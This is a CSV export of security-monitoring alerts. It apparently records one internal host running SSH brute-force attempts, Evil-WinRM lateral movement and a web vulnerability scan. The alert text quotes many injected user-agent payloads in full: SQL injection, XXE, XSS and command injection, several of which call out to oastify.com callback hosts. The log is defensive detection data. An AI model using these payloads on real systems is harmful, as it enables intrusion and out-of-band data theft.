SEVERITY,ID,OCCURRED_AT,TYPE,DETECTION_QUADS,SUMMARY,CONTENT,DETECTION,ASSET_IDS,SOURCE_HOST_NAME,DESTINATION_HOST_NAME,SOURCE_IP,DESTINATION_IP,OTHER_IP,SOURCE,PACKET_CAPTURE_STATE
Low,32841,2025-03-28T10:31:20Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,83cd8f92-5a22-4e79-be5e-c5372b47aa5a,
Low,32842,2025-03-28T10:31:20Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,3c2f8624-8ce8-418e-b45b-78f686317d6d,
Low,32844,2025-03-28T10:30:36Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.45.,SSH Authentication Failure,"2896,1774",,,10.0.242.127,10.0.7.45,,10a5479b-e1b7-4a96-96a8-f44ad882c3fb,
Medium,32924,2025-03-28T10:45:44Z,Indicator,Indicator,WinRM wsman Rapid Access - Possible Lateral Movement,WinRM wsman Rapid Access - Possible Lateral Movement,WinRM Signatures,"1914,1772",,,10.0.7.30,10.0.7.11,,Network Traffic,
Medium,32926,2025-03-28T10:45:44Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1914,1772",,,10.0.7.30,10.0.7.11,,Network Traffic,
Medium,32937,2025-03-28T10:45:44Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1914,1772",,,10.0.7.30,10.0.7.11,,Network Traffic,
Medium,32956,2025-03-28T10:53:08Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1914,1772",,,10.0.7.30,10.0.7.11,,Network Traffic,
Medium,32957,2025-03-28T10:52:58Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1914,1772",,,10.0.7.30,10.0.7.11,,Network Traffic,
Medium,32958,2025-03-28T10:53:15Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1914,1772",,,10.0.7.30,10.0.7.11,,Network Traffic,
Medium,32959,2025-03-28T10:53:18Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1914,1772",,,10.0.7.30,10.0.7.11,,Network Traffic,
Medium,32963,2025-03-28T10:55:21Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1914,1772",,,10.0.7.30,10.0.7.11,,Network Traffic,
Medium,32975,2025-03-28T10:58:36Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1914,1772",,,10.0.7.30,10.0.7.11,,Network Traffic,
Low,32976,2025-03-28T10:51:20Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.7.11 (1772) (Enterprise Management/Server) received RDP traffic from 10.0.7.30 (1914).,RDP to Enterprise Management Asset,"1914,1772",,,10.0.7.30,10.0.7.11,,9d5d0c20-cc80-438c-90a6-5de53bcb4eef,
Low,33086,2025-03-28T10:19:46Z,Communication,Configuration,New Global User Agent,"User Agent 'javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/wxxfdxijqixwb5bshu2nidy8dzjt7jvbmzhm7awX;.oastify.com/).replace(/.;/g,[])]//'src=>' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,f540395d-23e6-4983-9d17-58961bdbd301,
Low,33087,2025-03-28T10:19:44Z,Communication,Configuration,New Global User Agent,User Agent 'w41fkxpjxi4wi5isou9npd58kzqtej2buzpmfa4' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).,User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,c4fbfd69-17d8-4b03-8459-71e83fb41e0c,
Low,33088,2025-03-28T10:19:46Z,Communication,Configuration,New Global User Agent,"User Agent ''""><svg/onload=fetch`//cdtvtdyz6ydcrlr8xai3yteotfz9nzbr1fw2mqb\.oastify.com`>' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,41d51895-d677-4581-a587-48339a069b6f,
Low,33089,2025-03-28T10:19:39Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 ryda94i1gt' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (oastify.com).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,e3d150ca-e268-4b04-9cd4-51d239c3475c,
Low,33090,2025-03-28T10:19:39Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 wuq6mnru1y' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,f4a8a6ed-51dc-4893-8582-0b448a0b55ea,
Low,33091,2025-03-28T10:19:39Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 vp5ua6t7cu' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,3138565a-252e-4485-9a82-048fbdb4a1ba,
Low,33092,2025-03-28T10:19:02Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'+(function(){if(typeof zusps===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);zusps=1;}}())+'' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,75a01518-c914-4d45-957e-d8e89af5c534,
Low,33093,2025-03-28T10:19:01Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|echo cxshsd7ofj sqooozn4bw||a #' |echo cxshsd7ofj sqooozn4bw||a #|"" |echo cxshsd7ofj sqooozn4bw||a #' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,543b51a9-a7d0-4e8f-8786-67d3842e4668,
Low,33094,2025-03-28T10:19:33Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,002a480d-0dd4-4b6b-a39d-d7fd168138ad,
Low,33095,2025-03-28T10:19:01Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,97b4f440-eaa6-468c-8cdb-d5befae31ca5,
Low,33096,2025-03-28T10:19:01Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36&nslookup -q=cname d0ewgel0tz0deme9kb54lu1pggmaa0yvmq9gx5.oastify.com.&'\""`0&nslookup -q=cname d0ewgel0tz0deme9kb54lu1pggmaa0yvmq9gx5.oastify.com.&`'' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,8779f7c5-40dd-4d1a-9ba8-b74afe558428,
Low,33097,2025-03-28T10:19:01Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname hwh0cih4p3whaqadgf18hyxtckie64u1iw5mtb.oastify.com.&`'' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,14f286e9-dd6f-4757-8690-84a97773f75c,
Low,33098,2025-03-28T10:19:01Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname u0vdgvlhtg0ue3eqks5llb16gxmrahydm89yxn.oastify.com.&' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,0fffb38a-29fe-4701-9a86-ef36b748bd9a,
Low,33099,2025-03-28T10:19Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36erros%>j8fd7'/""<ylbim' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,db104263-9ee7-42f7-ad7f-c5607ea449a9,
Low,33100,2025-03-28T10:19Z,Communication,Configuration,New Global User Agent,"User Agent 'eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,5f339cd8-c6ce-4e1e-8908-463288132ed9,
Low,33101,2025-03-28T10:19:01Z,Communication,Configuration,New Global User Agent,User Agent 'nslookup -q=cname 1fhkv20o8nf1tatxzzks0igdv41ypodhg5bs1gq.oastify.com.&' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).,User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,ffdddeed-5cee-4bc0-9b2d-c303b65790e9,
Low,33102,2025-03-28T10:19Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36%}xm11i'/""<ht554' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,3c76a5e7-159d-4e65-9b2d-ac8dbf38adfb,
Low,33103,2025-03-28T10:19Z,Communication,Configuration,New Global User Agent,User Agent '74482dzwdl' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).,User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,6034e860-4a42-4d7e-b9a2-4c21102c55cb,
Low,33104,2025-03-28T10:18:59Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 9194=9196--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,d40901d2-ed28-4217-9902-ca74584974c2,
Low,33105,2025-03-28T10:19Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36}}m5u5y'/""<igbar' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,53cb8290-485b-4c5b-b913-3f2c7e8f104b,
Low,33106,2025-03-28T10:18:59Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 5533=5533--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,32785169-74a2-4e79-815f-256206ede2d3,
Low,33107,2025-03-28T10:18:59Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1431'='1437' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,1b6b06f8-875d-4845-8d21-73293922991c,
Low,33108,2025-03-28T10:18:59Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1007'='1007' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,32cf901e-d4a5-4845-b469-806741219c78,
Low,33109,2025-03-28T10:19Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36hg16dsilje' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,f43e9664-3d85-49ce-8a2a-568dbd5e76dd,
Low,33110,2025-03-28T10:18:59Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3632325369' or 4712=4719--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,ba50ed11-bee4-4167-96ce-b91c07da8b3c,
Low,33111,2025-03-28T10:18:58Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3652824194' or '8672'='8672' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,17fcf053-75bf-4761-b011-a01a381376a1,
Low,33112,2025-03-28T10:18:58Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' AND pg_sleep(20)--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,ae67df84-fc9b-4582-9c0a-0c5435622ad5,
Low,33113,2025-03-28T10:18:58Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3671263895' or '9441'='9442' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,c9b8a9ec-c68b-4d55-a33f-7628d3796d40,
Low,33114,2025-03-28T10:18:58Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3632356560' or 6812=6812--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,4f02b426-4158-4549-b5b2-f6c4268d04ab,
Low,33115,2025-03-28T10:18:58Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'||pg_sleep(20)--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b,
Low,33116,2025-03-28T10:18:57Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'+(select*from(select(sleep(20)))a)+'' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,98ce215e-4b7b-4256-8d26-138c63febaf4,
Low,33117,2025-03-28T10:18:57Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36')waitfor delay'0:0:20'--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,7302f785-7398-4ea0-b9c2-1ffe872dea9a,
Low,33118,2025-03-28T10:18:57Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,66c19703-3e0d-4ae0-917e-2e68394ccf12,
Low,33119,2025-03-28T10:18:56Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36');declare @q varchar(99);set @q='\\zqti60bmjlqz484vaxvqbgrb62cw0modh1co2cr.oasti'+'fy.com\hhb'; exec master.dbo.xp_dirtree @q;--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,d153c4a4-97a4-4ca1-ae2f-6ce504219d98,
Low,33120,2025-03-28T10:18:56Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36);declare @q varchar(99);set @q='\\1bdkr2wo4nb1papxvzgswicdr4xylo9f13wqmeb.oasti'+'fy.com\wvg'; exec master.dbo.xp_dirtree @q;--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,0702fdf7-2194-49b8-9172-e686bdc62080,
Low,33121,2025-03-28T10:18:57Z,Communication,Configuration,New Global User Agent,User Agent '(select load_file('\\\\hcx0six453chqqqdwfh8xydtskyem4avcj76xum.oastify.com\\hvd'))' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).,User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,33dfd8f0-89c6-45c5-9945-d6454ad95bc0,
Low,33122,2025-03-28T10:18:56Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36';declare @q varchar(99);set @q='\\qvp9brgdocvq9z9mfo0hg7w2bthn5dt4ksff53u.oasti'+'fy.com\khi'; exec master.dbo.xp_dirtree @q;--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,da96e8d3-4e88-46fd-865c-f44e857af4a0,
Low,33123,2025-03-28T10:18:57Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'+(select load_file('\\\\1z1kf2kosnz1dadxjz4ski0df4ly9oxf03vqlea.oastify.com\\msq'))+'' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,51240ccf-72e5-44a2-a017-d6b3b3b48401,
Low,33124,2025-03-28T10:17:20Z,Communication,Configuration,New Global User Agent,"User Agent 'javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/gyizehj3r2ygcpccie37jxzsejkc82wunii58txX;.oastify.com/).replace(/.;/g,[])]//'src=>' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,3583d196-89c9-45da-b501-3650ab7be063,
Low,33125,2025-03-28T10:18:56Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36;declare @q varchar(99);set @q='\\s4xbktpfxe4si1iooq9jp954kvqpef26sunhd52.oasti'+'fy.com\tcy'; exec master.dbo.xp_dirtree @q;--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,91aad983-e363-4a95-9c04-58632ff7d8b0,
Low,33126,2025-03-28T10:18:56Z,Communication,Configuration,New Global User Agent,"User Agent '(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % mfvkg SYSTEM ""http://c1evhdmzuy1cflf8la63mt2ohfn9bzz2nxanyc.oasti'||'fy.com/"">%mfvkg;]>'),'/l') from dual)' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,56d9a451-b562-4b45-a9c9-2adfc97c0051,
Low,33127,2025-03-28T10:18:56Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'||(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % mfvkg SYSTEM ""http://kpd35la7i6pk3t3g9iuba1qw5nbhz7nbb6ywml.oasti'||'fy.com/"">%mfvkg;]>'),'/l') from dual)||'' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,28a1cdba-eacf-4803-966c-87c85152c673,
Low,33128,2025-03-28T10:17:19Z,Communication,Configuration,New Global User Agent,"User Agent ''""><svg/onload=fetch`//ke23ulz776ekstsgyijbz1fwun0go6cy2mx9nxc\.oastify.com`>' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,2bfd31ff-74f8-4040-900e-3207c5c3117b,
Low,33129,2025-03-28T10:17:11Z,Communication,Configuration,New Global User Agent,User Agent 'pe78uqzc7bepsyslynjgz6f1us0locc44szfp3e' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).,User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,c2edc20e-39af-44a3-909e-e1c7c8625bdb,
Low,33130,2025-03-28T10:17:17Z,Communication,Configuration,New Global User Agent,"User Agent 'javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/ii41yj35b4iiwrwe2gn93zjuyl4es5gx7l28swhX;.oastify.com/).replace(/.;/g,[])]//'src=>' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,941e1705-e55e-42a1-8210-20347611a52e,
Low,33131,2025-03-28T10:17:17Z,Communication,Configuration,New Global User Agent,"User Agent ''""><svg/onload=fetch`//0pqj51animp0393w9yurahqc53bwznnfd38qyen\.oastify.com`>' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,c9a4d12c-7ada-4a0f-a89e-ae5190a7a2d9,
Low,33132,2025-03-28T10:17:07Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 ta18y2f5t6' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,c286d924-0d55-4760-ac12-5eb00d5a9060,
Low,33133,2025-03-28T10:17:12Z,Communication,Configuration,New Global User Agent,User Agent 'qnh93r8dgcnq1z1m7osh87o23t9mxcl4ds8fy3n' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).,User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,220c8f8b-87bf-4e7a-900a-87411fedb1ab,
Low,33134,2025-03-28T10:17:01Z,Communication,Configuration,New Global User Agent,"User Agent '`z'z""${{%{{\' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,191a6233-12ee-41dd-9530-f2cefd1630f7,
